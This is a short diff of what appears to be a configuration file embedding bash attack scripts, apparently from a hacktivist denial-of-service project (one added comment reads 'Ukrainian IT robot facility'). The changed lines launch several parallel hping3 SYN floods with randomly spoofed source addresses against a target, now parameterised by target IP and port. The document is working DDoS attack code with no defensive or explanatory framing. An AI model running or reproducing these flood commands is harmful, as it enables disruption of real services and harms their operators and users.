@@ -82,16 +82,17 @@ script_content: |
               echo $rand_ip
           }
 
-          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -0 &
-          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -0 &
-          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -0 &
-          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -1 &
-          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -1 &
-          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a $(generate_ip_address) ${target_ip} -S -d 120 --flood -p ${target_port} -0 &
+          sudo hping3 -a $(generate_ip_address) ${target_ip} -S -d 120 --flood -p ${target_port} -0 &
+          sudo hping3 -a $(generate_ip_address) ${target_ip} -S -d 120 --flood -p ${target_port} -0 &
+          sudo hping3 -a $(generate_ip_address) ${target_ip} -S -d 120 --flood -p ${target_port} -1 &
+          sudo hping3 -a $(generate_ip_address) ${target_ip} -S -d 120 --flood -p ${target_port} -1 &
+          sudo hping3 -a $(generate_ip_address) ${target_ip} -S -d 120 --flood -p ${target_port} -1 &
 
 script_content_mirgorod: |
           #!/usr/bin/env bash
           # ping # all humans will be health
+          # Ukrainian IT robot facility
           generate_ip_address() {
               local rand_ip=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
               echo $rand_ip
